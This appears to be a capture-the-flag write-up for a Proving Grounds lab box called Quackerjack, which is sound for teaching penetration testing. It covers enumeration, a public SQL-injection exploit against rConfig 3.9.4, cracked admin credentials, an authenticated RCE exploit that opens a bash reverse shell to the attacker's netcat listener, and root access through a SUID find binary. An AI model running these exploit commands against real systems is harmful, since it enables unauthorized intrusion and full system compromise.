---
description: Pg Practice Quackerjack writeup
---

# Quackerjack

![](<../../../.gitbook/assets/image (789) (1).png>)

## Nmap

```
sudo nmap 192.168.150.57 -sS -p- -sV 

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
Service Info: Host: QUACKERJACK; OS: Unix
```

## FTP

I performed a quick check for anonymous login on FTP and was returned a logon error.

![](<../../../.gitbook/assets/image (721).png>)

## SMB

As we have no luck with FTP I then run `enum4linux` against the target to look for users, groups and to perform RID cycling.

```
enum4linux -U -G -r 192.168.189.98
```

Unfortunately `enum4linux` did not return any relevant users information. I also checked null authentication against the target.

```
smbmap -u '' -p '' -R -H 192.168.150.57
```

![](<../../../.gitbook/assets/image (722) (1).png>)

## HTTP

As we have HTTP running on port 80 and 8081 we can run `gobuster` against these ports.

```
gobuster dir -u http://192.168.150.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 -x txt,zip,php
gobuster dir -u https://192.168.150.57:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 -x txt,zip,php -k
```

![](<../../../.gitbook/assets/image (733).png>)

The default page for 80 brings us to a CentOS Apache test page.

![](<../../../.gitbook/assets/image (734).png>)

On port 8081 we come to a login page for rConfig. As we can see from the landing page rConfig is running on version 3.9.4.

![](<../../../.gitbook/assets/image (723) (1).png>)

## Exploitation

A Google search reveals a multitude of exploits for this for varying versions. I went thought a fair few some of which I could not get to work which are specific to 3.9.4. Eventually I come across a SQL injection exploit.

![](<../../../.gitbook/assets/image (724).png>)

{% embed url="https://www.exploit-db.com/exploits/48208" %}

Run the exploit with the following syntax.

```
python3 exploit.py https://192.168.150.57:8081
```

![](<../../../.gitbook/assets/image (725).png>)

We manage to extract a hash. I identified this as a MD5 hash and was not able to crack with `John` using the rockyou.txt. I ended putting the hash into online databases to find a match.

{% embed url="https://www.md5online.org/md5-decrypt.html" %}

![](<../../../.gitbook/assets/image (726).png>)

We now have the following credentials for rConfig.

```
admin:abgrtyu
```

![](<../../../.gitbook/assets/image (735).png>)

## Exploitation (Authenticated)

Now that we are authenticated we can search for authenticated exploits. I soon come across an authenticated remote code execution exploit for 3.9.3. Whilst not intended for the version we have 3.9.4 we can try it anyway.

{% embed url="https://www.exploit-db.com/exploits/47982" %}

Looking at the exploit code looks like we supply the arguments below and in return the payload will attempt a bash reverse shell back to us.

![](<../../../.gitbook/assets/image (727) (1).png>)

First set up a `netcat` listener on our attacking machine. I am going to use port 80 this is a common port for outbound traffic.

```
sudo nc -lvp 80
```

Then execute the exploit with the following syntax:

```
python3 ./exploit.py https://<Target-IP>:8081 admin abgrtyu <Attacking-IP> 80
```

Once we have run the exploit we should get a shell back on our listener.

![](<../../../.gitbook/assets/image (728) (1).png>)

We confirm we are the apache user.

## Privilege Escalation

In the home directory we have the user 'rConfig'. I grabbed the local.txt flag and then started a `Python SimpleHTTPServer` on my attacking machine. I then uploaded `linpeas.sh` to aid with privilege escalation.

![](<../../../.gitbook/assets/image (729).png>)

After running `linpeas` and going through the results we actually have various potential exploits. I will be focusing on the SUID being set on the find binary.

![](<../../../.gitbook/assets/image (730) (1).png>)

We can check on [GTFObins](https://gtfobins.github.io/gtfobins/find/) for how we cab use the binary for privilege escalation.

![](<../../../.gitbook/assets/image (731).png>)

Lets use the syntax above and call the binary and see if we can escape the restricted shell as root.

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Once we escape we should have a root shell.

![](<../../../.gitbook/assets/image (732).png>)
